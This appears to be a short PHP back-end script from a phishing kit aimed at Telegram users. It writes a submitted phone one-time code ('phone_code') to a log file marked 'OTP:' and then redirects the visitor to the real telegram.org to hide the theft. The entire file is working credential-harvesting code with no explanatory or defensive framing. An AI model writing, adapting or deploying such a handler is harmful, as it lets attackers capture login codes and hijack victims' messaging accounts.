<?php

    file_put_contents("log.txt", "OTP: " . $_POST['phone_code'] . "\n", FILE_APPEND);
header('Location: https://telegram.org');
exit();